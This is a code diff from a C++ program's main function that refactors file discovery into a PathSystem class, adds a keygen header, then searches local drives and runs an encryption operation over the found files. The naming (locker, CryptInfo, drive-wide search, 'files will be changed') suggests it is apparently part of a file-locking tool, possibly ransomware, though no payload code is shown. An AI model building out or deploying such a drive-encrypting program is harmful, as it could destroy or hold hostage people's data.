@@ -8,7 +8,7 @@
 #include "logs.h"
 #include "network/server/server.h"
 #include "network/client/client.h"
-
+#include "keygen.h"
 
 typedef void (*operation_func)(CRYPT_INFO* CryptInfo, DRIVE_INFO* data);
 void execute_operation(LIST<DRIVE_INFO>* DriveInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo, int f);
@@ -24,9 +24,7 @@ int main(int argc, char* argv[])
     base64::init_table_base64_decode();
 
     BOOL success = FALSE;
-    LIST<DRIVE_INFO>* DriveInfo = new LIST<DRIVE_INFO>;
-    PDRIVE_INFO data = NULL;
-    int f;
+    PathSystem psys(GLOBAL_PATH.g_Path);
     CRYPT_INFO* CryptInfo = new CRYPT_INFO;
     std::chrono::time_point<std::chrono::high_resolution_clock> start_time;
 
@@ -37,24 +35,24 @@ int main(int argc, char* argv[])
         goto exit;
     }
 
+
     if (!locker::GeneratePolicy(CryptInfo))
     { LOG_ERROR("Failed to Generate Policy."); goto exit; }
 
-    f = pathsystem::StartLocalSearch(DriveInfo, GLOBAL_PATH.g_Path);
-    if (f == 0) { LOG_ERROR("No files. null."); goto exit; }
-    LOG_DISABLE("After this operation %d files will be changed", f);
-
-    LIST_FOREACH(data, DriveInfo)
-        LOG_INFO("Filename: " log_str, data->Filename);
+    
+    psys.start_local_search();
+    if (psys.f_count == 0) { LOG_ERROR("No files. null."); goto exit; }
+    LOG_DISABLE("After this operation %d files will be changed", psys.f_count);
+    LIST_FOREACH(psys.data, psys.drive_info)
+        LOG_INFO("Filename: " log_str, psys.data->Filename);
     if (!global::print_command_g()) goto exit;
     start_time = std::chrono::high_resolution_clock::now();
-    
-    execute_operation(DriveInfo, data, CryptInfo, f);
+
+    execute_operation(psys.drive_info, psys.data, CryptInfo, psys.f_count);
 
     success = TRUE;
 exit:
     locker::FreeCryptInfo(CryptInfo);
-    pathsystem::FreeList(DriveInfo);
     global::free_global();
     if (success)
     {
